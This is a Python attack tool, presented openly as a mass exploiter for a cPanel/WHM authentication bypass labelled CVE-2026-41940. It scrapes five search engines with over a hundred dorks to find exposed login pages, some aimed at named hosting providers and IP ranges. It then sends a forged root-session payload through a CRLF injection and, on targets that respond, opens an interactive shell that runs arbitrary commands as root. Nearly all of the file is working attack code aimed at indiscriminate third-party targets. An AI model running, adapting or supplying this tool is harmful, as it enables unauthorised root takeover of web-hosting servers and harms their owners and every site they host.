#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AutoCVE-2026-41940.py — CPANEL/WHM EXPLOITER (MULTI-ENGINE DORK MODE)
- Uses: DuckDuckGo, Bing, Yahoo, Yandex, Mojeek
- 200+ dorks for cPanel/WHM
- Scrapes MULTIPLE PAGES per dork per engine
- Tests each URL with 4-stage exploit
- Opens shell on vulnerable targets
"""

import sys, os, re, json, ssl, socket, ipaddress, argparse, threading, time, random, cmd, queue
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse, urlsplit, quote, unquote, urlencode
import urllib.request, urllib.error

# ============ CONFIGURATION ============
COLLECTION_FILE = "cpanel_whm_urls.txt"
VULNERABLE_FILE = "vulnerable_targets.txt"
REQUEST_TIMEOUT = 15
SEARCH_DELAY = 2
PAGES_PER_DORK = 3  # Pages per engine per dork

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0',
]

# ============ 200+ CPANEL/WHM DORKS ============
DORKS = [
    # Basic WHM dorks
    "intitle:WHM login",
    "intitle:\"WebHost Manager\"",
    "inurl:whm login",
    "inurl:/whm login",
    "intext:\"WHM Login\"",
    
    # Basic cPanel dorks
    "intitle:cPanel login",
    "intitle:\"cPanel Login\"",
    "inurl:cpanel login",
    "inurl:/cpanel login",
    "intext:\"cPanel Login\"",
    
    # Port-based dorks
    "inurl:2087",
    "inurl:2083",
    "inurl:2087 whm",
    "inurl:2083 cpanel",
    "inurl:2087 \"WHM Login\"",
    "inurl:2083 \"cPanel Login\"",
    "inurl:\":2087\"",
    "inurl:\":2083\"",
    
    # Server pattern dorks (.server1:2087, etc.)
    "inurl:.server1:2087",
    "inurl:.server2:2087",
    "inurl:.server1:2083",
    "inurl:.server2:2083",
    "inurl:server1:2087",
    "inurl:server2:2087",
    "inurl:server1:2083",
    "inurl:server2:2083",
    "inurl:cp1:2083",
    "inurl:cp2:2083",
    "inurl:whm1:2087",
    "inurl:whm2:2087",
    "inurl:web1:2083",
    "inurl:web2:2083",
    "inurl:host1:2087",
    "inurl:host2:2087",
    "inurl:srv1:2083",
    "inurl:srv2:2083",
    "inurl:node1:2087",
    "inurl:node2:2087",
    "inurl:panel1:2083",
    "inurl:panel2:2087",
    "inurl:secure1:2083",
    "inurl:secure2:2087",
    "inurl:reseller1:2083",
    "inurl:reseller2:2087",
    "inurl:vps1:2083",
    "inurl:vps2:2087",
    "inurl:dedicated1:2083",
    "inurl:dedicated2:2087",
    
    # Hostname pattern dorks
    "inurl:cpanel.host",
    "inurl:cpanel.server",
    "inurl:cpanel.web",
    "inurl:whm.host",
    "inurl:whm.server",
    "inurl:webmail.host",
    "inurl:cp.host",
    
    # Path-based dorks
    "inurl:/cpanel/login",
    "inurl:/whm/login",
    "inurl:/cgi-sys/cpanel",
    "inurl:/cgi-sys/whm",
    "inurl:/securecpanel",
    "inurl:/securewhm",
    "inurl:/cpsess",
    "inurl:/cpsess/login",
    "inurl:/webmail/cpanel",
    
    # Title-based dorks
    "intitle:\"cPanel & WHM\"",
    "intitle:\"WebHost Manager\" cPanel",
    "intitle:\"cPanel Login\" \"port 2083\"",
    "intitle:\"WHM Login\" \"port 2087\"",
    
    # Combined dorks
    "intitle:cPanel inurl:2083",
    "intitle:WHM inurl:2087",
    "intitle:\"cPanel Login\" inurl:2083",
    "intitle:\"WHM Login\" inurl:2087",
    
    # Hosting provider dorks
    "site:cpanel.hostgator.com",
    "site:whm.hostgator.com",
    "site:cpanel.bluehost.com",
    "site:whm.bluehost.com",
    "site:cpanel.dreamhost.com",
    "site:whm.dreamhost.com",
    "site:cpanel.siteground.com",
    "site:whm.siteground.com",
    "site:cpanel.a2hosting.com",
    "site:whm.a2hosting.com",
    "site:cpanel.inmotionhosting.com",
    "site:whm.inmotionhosting.com",
    "site:cpanel.godaddy.com",
    "site:whm.godaddy.com",
    "site:cpanel.namecheap.com",
    "site:whm.namecheap.com",
    
    # IP pattern dorks
    "inurl:192.185.:2083",
    "inurl:192.185.:2087",
    "inurl:198.54.:2083",
    "inurl:198.54.:2087",
    "inurl:162.241.:2083",
    "inurl:162.241.:2087",
    "inurl:67.225.:2083",
    "inurl:67.225.:2087",
    "inurl:104.168.:2083",
    "inurl:104.168.:2087",
    "inurl:208.89.:2083",
    "inurl:208.89.:2087",
    
    # Additional comprehensive dorks
    "intitle:cPanel \"login\" \"username\"",
    "intitle:WHM \"login\" \"username\"",
    "\"cPanel Control Panel\" login",
    "\"WHM Control Panel\" login",
    "\"cPanel Account\" login",
    "\"WHM Account\" login",
    "inurl:\":2083/cpanel\"",
    "inurl:\":2087/whm\"",
    "inurl:2083 cpanel login page",
    "inurl:2087 whm login page",
    "inurl:\":2083/cpsess\"",
    "inurl:\":2087/cpsess\"",
    "inurl:/:2083 login",
    "inurl:/:2087 login",
    "\"Please login\" cpanel",
    "\"Please login\" whm",
    "\"Enter your username\" cpanel",
    "\"Enter your username\" whm",
    "cpanel webhosting login",
    "whm webhosting login",
    "cpanel server administration",
    "whm server administration",
]

# ============ COLORS ============
class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; PURPLE = "\033[95m"; CYAN = "\033[96m"
    BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"
    ORANGE = "\033[38;5;208m"

LOG_LOCK = threading.Lock()

def log(level, msg, target=""):
    icons = {"INFO": f"{C.BLUE}[INFO]{C.RESET}", "OK": f"{C.GREEN}[ OK ]{C.RESET}",
             "ERR": f"{C.RED}[ERR]{C.RESET}", "PWNED": f"{C.RED}{C.BOLD}[PWND]{C.RESET}",
             "FIND": f"{C.ORANGE}[FIND]{C.RESET}", "SHELL": f"{C.GREEN}[SHELL]{C.RESET}",
             "TEST": f"{C.YELLOW}[TEST]{C.RESET}", "SAVE": f"{C.GREEN}[SAVE]{C.RESET}",
             "SEARCH": f"{C.PURPLE}[SEARCH]{C.RESET}", "STAGE": f"{C.CYAN}[STAGE]{C.RESET}",
             "SHELL_FAIL": f"{C.RED}[SHELL FAIL]{C.RESET}", "QUEUE": f"{C.BLUE}[QUEUE]{C.RESET}",
             "PAGE": f"{C.PURPLE}[PAGE]{C.RESET}"}
    icon = icons.get(level, f"[{level}]")
    t = f" {C.DIM}{target}{C.RESET}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{datetime.now().strftime('%H:%M:%S')}{C.RESET} {icon} {msg}{t}")

def safe_print(msg):
    print(msg, flush=True)

def banner():
    print(f"""{C.ORANGE}{C.BOLD}
   █████╗ ██╗   ██╗████████╗ ██████╗
  ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
  ███████║██║   ██║   ██║   ██║   ██║
  ██╔══██║██║   ██║   ██║   ██║   ██║
  ██║  ██║╚██████╔╝   ██║   ╚██████╔╝
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝{C.RESET}
{C.CYAN}  CVE-2026-41940 — MULTI-ENGINE CPANEL/WHM EXPLOITER{C.RESET}
{C.DIM}  Engines: DuckDuckGo | Bing | Yahoo | Yandex | Mojeek{C.RESET}
{C.DIM}  {len(DORKS)} dorks × {PAGES_PER_DORK} pages × 5 engines = {len(DORKS)*PAGES_PER_DORK*5} searches{C.RESET}
{C.GREEN}  Finds cPanel/WHM URLs | Tests 4-stage exploit | Shell on vulnerable{C.RESET}
""")

# ============ SSL Context ============
class _SSLCtx:
    _ctx = None
    @classmethod
    def get(cls):
        if not cls._ctx:
            c = ssl.create_default_context()
            c.check_hostname = False
            c.verify_mode = ssl.CERT_NONE
            cls._ctx = c
        return cls._ctx

BASE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

class R:
    def __init__(self, status, body, headers, url, raw_cookies=""):
        self.status = status
        self.body = body
        self.headers = headers
        self.url = url
        self.raw_cookies = raw_cookies
    def h(self, k, default=""):
        return self.headers.get(k.lower(), default)
    def location(self):
        return self.h("location")
    def raw_cookie(self, name):
        for line in self.raw_cookies.split("\n"):
            if line.lower().startswith(name.lower() + "="):
                return line.split("=", 1)[1].split(";", 1)[0].strip()
        return ""

def _do(url, method="GET", extra_headers=None, data=None, timeout=REQUEST_TIMEOUT, follow=False, canonical_host=None):
    try:
        parsed = urlparse(url)
        headers = {"User-Agent": BASE_UA, "Accept": "*/*", "Connection": "close"}
        if canonical_host:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            headers["Host"] = f"{canonical_host}:{port}" if port not in (80,443) else canonical_host
        if extra_headers:
            headers.update(extra_headers)

        body_bytes = None
        if data:
            if isinstance(data, dict):
                body_bytes = urlencode(data).encode()
                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
            elif isinstance(data, str):
                body_bytes = data.encode()

        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=_SSLCtx.get()))
        req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            rh = {}
            raw_ck = []
            for k, v in resp.headers.items():
                rh[k.lower()] = v
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
            return R(resp.status, body, rh, resp.url, "\n".join(raw_ck))
    except Exception as e:
        return R(0, str(e), {}, url, "")

# ============ CVE-2026-41940 PAYLOAD ============
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# ============ SEARCH ENGINE FUNCTIONS ============
def fetch_html(url):
    """Fetch HTML with proper headers"""
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': 'text/html,application/xhtml+xml'}
    req = urllib.request.Request(url, headers=headers)
    ctx = _SSLCtx.get()
    try:
        with urllib.request.urlopen(req, timeout=20, context=ctx) as resp:
            raw = resp.read()
            if resp.info().get('Content-Encoding') == 'gzip':
                import gzip
                raw = gzip.decompress(raw)
            return raw.decode('utf-8', errors='replace')
    except:
        return ""

def extract_urls_from_html(html, engine_name=""):
    """Extract URLs from search engine HTML"""
    urls = []
    
    # Pattern for DuckDuckGo
    if engine_name == "duckduckgo":
        found = re.findall(r'uddg=(https?[^&"<>\s]+)', html)
        for u in found:
            u = unquote(u)
            if any(x in u.lower() for x in ['cpanel', 'whm', '2083', '2087', 'webhost', 'cpsess']):
                urls.append(u)
    
    # Pattern for Bing
    elif engine_name == "bing":
        found = re.findall(r'<a href="(https?://[^"]+)"[^>]*>', html)
        for u in found:
            if any(x in u.lower() for x in ['cpanel', 'whm', '2083', '2087', 'webhost', 'cpsess']):
                if 'bing.com' not in u and 'microsoft.com' not in u:
                    urls.append(u)
    
    # Pattern for Yahoo
    elif engine_name == "yahoo":
        found = re.findall(r'/RU=(https?[^/]+)/', html)
        for u in found:
            u = unquote(u)
            if any(x in u.lower() for x in ['cpanel', 'whm', '2083', '2087', 'webhost', 'cpsess']):
                urls.append(u)
    
    # Pattern for Yandex
    elif engine_name == "yandex":
        found = re.findall(r'data-url="(https?://[^"]+)"', html)
        for u in found:
            if any(x in u.lower() for x in ['cpanel', 'whm', '2083', '2087', 'webhost', 'cpsess']):
                urls.append(u)
        if not urls:
            found = re.findall(r'href="(https?://[^"]+)"', html)
            for u in found:
                if any(x in u.lower() for x in ['cpanel', 'whm', '2083', '2087', 'webhost', 'cpsess']):
                    if 'yandex.com' not in u:
                        urls.append(u)
    
    # Pattern for Mojeek
    elif engine_name == "mojeek":
        found = re.findall(r'href="(https?://[^"]+)"[^>]*class="ob"', html)
        if not found:
            found = re.findall(r'<a[^>]+href="(https?://[^"]+)"[^>]*>[^<]{10,}', html)
        for u in found:
            if any(x in u.lower() for x in ['cpanel', 'whm', '2083', '2087', 'webhost', 'cpsess']):
                urls.append(u)
    
    return list(dict.fromkeys(urls))

# ============ SEARCH FUNCTIONS ============
def search_duckduckgo(dork, page=1):
    """Search DuckDuckGo"""
    encoded = quote(dork)
    search_url = f"https://html.duckduckgo.com/html/?q={encoded}&kl=en-us&s={(page-1)*50}"
    html = fetch_html(search_url)
    return extract_urls_from_html(html, "duckduckgo")

def search_bing(dork, page=1):
    """Search Bing"""
    encoded = quote(dork)
    start = (page-1) * 10
    search_url = f"https://www.bing.com/search?q={encoded}&first={start}"
    html = fetch_html(search_url)
    return extract_urls_from_html(html, "bing")

def search_yahoo(dork, page=1):
    """Search Yahoo"""
    encoded = quote(dork)
    b = (page-1) * 10
    search_url = f"https://search.yahoo.com/search?p={encoded}&b={b}"
    html = fetch_html(search_url)
    return extract_urls_from_html(html, "yahoo")

def search_yandex(dork, page=1):
    """Search Yandex"""
    encoded = quote(dork)
    p = page
    search_url = f"https://yandex.com/search/?text={encoded}&lr=en&p={p}"
    html = fetch_html(search_url)
    return extract_urls_from_html(html, "yandex")

def search_mojeek(dork, page=1):
    """Search Mojeek"""
    encoded = quote(dork)
    search_url = f"https://www.mojeek.com/search?q={encoded}&lang=en&page={page}"
    html = fetch_html(search_url)
    return extract_urls_from_html(html, "mojeek")

# ============ URL STORAGE ============
priority_queue = queue.PriorityQueue()
all_urls = set()
url_lock = threading.Lock()
tested_urls = set()
total_found = 0
current_testing = None
testing_lock = threading.Lock()

def add_url(url, priority=5):
    global total_found
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    with url_lock:
        if url not in all_urls:
            all_urls.add(url)
            total_found += 1
            with open(COLLECTION_FILE, 'a') as f:
                f.write(f"{url}\n")
            log("SAVE", f"[{total_found}] {url[:70]}")
            priority_queue.put((priority, url))

# ============ FULL 4-STAGE EXPLOIT ============
def test_exploit(target_url):
    global current_testing
    
    with testing_lock:
        current_testing = target_url
    
    try:
        if "://" not in target_url:
            target_url = "https://" + target_url
        
        parsed = urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or 2083
        scheme = parsed.scheme or "https"
        
        print(f"\n{C.YELLOW}{'='*70}{C.RESET}")
        print(f"{C.BOLD}[TESTING] {host}:{port}{C.RESET}")
        print(f"{C.YELLOW}{'='*70}{C.RESET}\n")
        
        # STAGE 0
        print(f"{C.CYAN}[STAGE 0/4] Discovering canonical hostname...{C.RESET}")
        canon_url = f"{scheme}://{host}:{port}/openid_connect/cpanelid"
        canon_resp = _do(canon_url, timeout=8, follow=False)
        canonical = host
        if canon_resp.location():
            m = re.match(r"^https?://([^:/]+)", canon_resp.location())
            if m:
                canonical = m.group(1)
        print(f"  → Canonical: {C.GREEN}{canonical}{C.RESET}\n")
        
        # STAGE 1
        print(f"{C.CYAN}[STAGE 1/4] Minting preauth session...{C.RESET}")
        login_url = f"{scheme}://{host}:{port}/login/?login_only=1"
        resp = _do(login_url, method="POST", data={"user": "root", "pass": "wrong"}, 
                   timeout=REQUEST_TIMEOUT, canonical_host=canonical)
        
        if resp.status not in (200, 401):
            print(f"  → {C.RED}FAILED: HTTP {resp.status}{C.RESET}\n")
            log("SHELL_FAIL", f"{host}:{port} - Stage 1 failed (HTTP {resp.status})")
            return None
        
        print(f"  → HTTP {resp.status}")
        
        session_base = None
        raw_ck = resp.raw_cookie("whostmgrsession")
        if not raw_ck:
            m = re.search(r'whostmgrsession=([^;,\s]+)', resp.h("set-cookie", ""), re.I)
            if m:
                raw_ck = m.group(1)
        
        if not raw_ck:
            print(f"  → {C.RED}FAILED: No whostmgrsession cookie{C.RESET}\n")
            log("SHELL_FAIL", f"{host}:{port} - No session cookie")
            return None
        
        session_base = unquote(raw_ck).split(",", 1)[0] if "," in unquote(raw_ck) else unquote(raw_ck)
        print(f"  → {C.GREEN}Session obtained: {session_base[:30]}...{C.RESET}\n")
        
        # STAGE 2
        print(f"{C.CYAN}[STAGE 2/4] CRLF injection...{C.RESET}")
        cookie_enc = quote(session_base)
        inject_url = f"{scheme}://{host}:{port}/"
        resp = _do(inject_url, method="GET",
                   extra_headers={"Authorization": f"Basic {PAYLOAD_B64}",
                                "Cookie": f"whostmgrsession={cookie_enc}"},
                   timeout=REQUEST_TIMEOUT, canonical_host=canonical)
        
        loc = resp.location()
        m = re.search(r"/cpsess(\d{10})", loc)
        if not m:
            print(f"  → {C.RED}FAILED: No cpsess token{C.RESET}\n")
            log("SHELL_FAIL", f"{host}:{port} - CRLF injection failed")
            return None
        
        token = f"/cpsess{m.group(1)}"
        print(f"  → {C.GREEN}Token: {token}{C.RESET}\n")
        
        # STAGE 3
        print(f"{C.CYAN}[STAGE 3/4] Triggering do_token_denied gadget...{C.RESET}")
        prop_url = f"{scheme}://{host}:{port}/scripts2/listaccts"
        prop_resp = _do(prop_url, method="GET",
                        extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                        timeout=REQUEST_TIMEOUT, canonical_host=canonical)
        print(f"  → HTTP {prop_resp.status}\n")
        
        # STAGE 4
        print(f"{C.CYAN}[STAGE 4/4] Verifying WHM root access...{C.RESET}")
        verify_url = f"{scheme}://{host}:{port}{token}/json-api/version"
        resp = _do(verify_url, method="GET",
                   extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                   timeout=REQUEST_TIMEOUT, canonical_host=canonical)
        
        if resp.status == 200 and '"version"' in (resp.body or ""):
            version = re.search(r'"version"\s*:\s*"([^"]+)"', resp.body)
            version = version.group(1) if version else "unknown"
            
            print(f"\n{C.RED}{C.BOLD}{'='*70}{C.RESET}")
            print(f"{C.RED}{C.BOLD}[PWND] {host}:{port} - VULNERABLE!{C.RESET}")
            print(f"{C.GREEN}Version: {version}{C.RESET}")
            print(f"{C.RED}{C.BOLD}{'='*70}{C.RESET}\n")
            
            log("PWNED", f"{host}:{port} - VULNERABLE! Version: {version}")
            
            with open(VULNERABLE_FILE, 'a') as f:
                f.write(f"{target_url} | Version: {version} | {datetime.now()}\n")
            
            print(f"{C.GREEN}[SHELL] Opening WHM root shell on {host}{C.RESET}")
            print(f"{C.DIM}Type 'exit' to close shell and continue scanning{C.RESET}\n")
            
            ctx = (scheme, host, port, canonical, session_base, token, REQUEST_TIMEOUT)
            shell = WHMShell(ctx, host)
            shell.cmdloop()
            
            print(f"\n{C.YELLOW}[SHELL] Closed, continuing scan...{C.RESET}\n")
            
            return {"host": host, "port": port, "version": version}
        else:
            print(f"  → {C.RED}FAILED: HTTP {resp.status}{C.RESET}")
            print(f"  → {C.RED}[SHELL FAIL] {host}:{port} - Not vulnerable{C.RESET}\n")
            log("SHELL_FAIL", f"{host}:{port} - Not vulnerable")
            return None
            
    except Exception as e:
        print(f"  → {C.RED}ERROR: {str(e)[:80]}{C.RESET}\n")
        log("SHELL_FAIL", f"Error on {target_url}: {str(e)[:80]}")
        return None
    finally:
        with testing_lock:
            current_testing = None

# ============ INTERACTIVE SHELL ============
class WHMShell(cmd.Cmd):
    def __init__(self, ctx, host):
        super().__init__()
        self.ctx = ctx
        self.host = host
        self.scheme, self.h, self.port, self.canonical, self.session_base, self.token, self.timeout = ctx
        self.prompt = f"{C.RED}whm{C.RESET}@{C.CYAN}{host}{C.RESET} {C.BOLD}#{C.RESET} "
    
    def do_exec(self, arg):
        if not arg:
            return
        cookie_enc = quote(self.session_base)
        url = f"{self.scheme}://{self.h}:{self.port}{self.token}/json-api/scripts/exec?api.version=1&command={quote(arg)}"
        resp = _do(url, method="GET",
                   extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                   timeout=self.timeout, canonical_host=self.canonical)
        try:
            data = json.loads(resp.body)
            output = data.get("data", {}).get("output", str(data))
            print(f"{C.GREEN}{output}{C.RESET}")
        except:
            print(f"{C.GREEN}{resp.body[:500]}{C.RESET}")
    
    def do_id(self, arg):
        self.do_exec("id")
    
    def do_whoami(self, arg):
        self.do_exec("whoami")
    
    def do_help(self, arg):
        print(f"""
{C.CYAN}Commands:{C.RESET}
  exec <cmd>  - Execute system command
  id          - Show user ID
  whoami      - Show current user
  exit        - Close shell, continue scanning
""")
    
    def default(self, line):
        self.do_exec(line)
    
    def do_exit(self, arg):
        return True
    do_EOF = do_exit

# ============ MULTI-ENGINE DORK WORKER ============
def dork_worker():
    """Run through all dorks across all search engines"""
    dork_idx = 0
    total_dorks = len(DORKS)
    engines = [
        ("DuckDuckGo", search_duckduckgo),
        ("Bing", search_bing),
        ("Yahoo", search_yahoo),
        ("Yandex", search_yandex),
        ("Mojeek", search_mojeek),
    ]
    
    while True:
        dork = DORKS[dork_idx % total_dorks]
        
        for engine_name, engine_fn in engines:
            log("SEARCH", f"[{engine_name}] {dork[:50]}...")
            
            # Search multiple pages per engine
            total_urls = []
            for page in range(1, PAGES_PER_DORK + 1):
                try:
                    urls = engine_fn(dork, page)
                    if urls:
                        log("PAGE", f"Page {page}: found {len(urls)} URLs")
                        total_urls.extend(urls)
                    else:
                        break
                    time.sleep(1)
                except Exception as e:
                    log("ERR", f"Page {page} error: {str(e)[:50]}")
                    break
            
            # Add unique URLs to queue
            new = 0
            for url in list(dict.fromkeys(total_urls))[:30]:
                if url not in all_urls:
                    add_url(url, priority=3)
                    new += 1
            if total_urls:
                log("FIND", f"{engine_name}: {len(total_urls)} URLs ({new} new)")
            else:
                log("FIND", f"{engine_name}: No results")
            
            time.sleep(SEARCH_DELAY)
        
        dork_idx += 1
        log("SEARCH", f"Completed dork {dork_idx}/{total_dorks}, continuing cycle...")
        time.sleep(2)

# ============ TESTER WORKER ============
def tester_worker():
    """Processes priority queue"""
    while True:
        try:
            priority, url = priority_queue.get(timeout=2)
        except queue.Empty:
            time.sleep(1)
            continue
        
        if url in tested_urls:
            priority_queue.task_done()
            continue
        
        tested_urls.add(url)
        log("TEST", f"Processing: {url[:70]}...")
        test_exploit(url)
        priority_queue.task_done()
        time.sleep(0.5)

def status_reporter():
    """Report status every 30 seconds"""
    while True:
        time.sleep(30)
        with url_lock:
            log("INFO", f"Queue: {priority_queue.qsize()} | URLs found: {total_found} | Tested: {len(tested_urls)}")
            if current_testing:
                log("INFO", f"Testing: {current_testing[:70]}")

# ============ MAIN ============
def main():
    banner()
    
    log("INFO", f"Starting MULTI-ENGINE CPANEL/WHM EXPLOITER")
    log("INFO", f"Engines: DuckDuckGo, Bing, Yahoo, Yandex, Mojeek")
    log("INFO", f"Dorks loaded: {len(DORKS)}")
    log("INFO", f"Pages per engine per dork: {PAGES_PER_DORK}")
    log("INFO", f"Total searches per cycle: {len(DORKS) * PAGES_PER_DORK * 5}")
    
    # Start workers
    threading.Thread(target=dork_worker, daemon=True).start()
    threading.Thread(target=tester_worker, daemon=True).start()
    threading.Thread(target=status_reporter, daemon=True).start()
    
    log("OK", "Started dorking and testing across 5 search engines")
    log("INFO", f"{C.YELLOW}Cycling through {len(DORKS)} dorks, {PAGES_PER_DORK} pages each, 5 engines{C.RESET}")
    log("INFO", f"{C.GREEN}When vulnerable found → shell opens automatically{C.RESET}")
    log("INFO", "Press Ctrl+C to stop\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}Shutting down...{C.RESET}")
        log("INFO", f"Total URLs found: {total_found}")
        log("INFO", f"Total tested: {len(tested_urls)}")
        sys.exit(0)

if __name__ == "__main__":
    main()
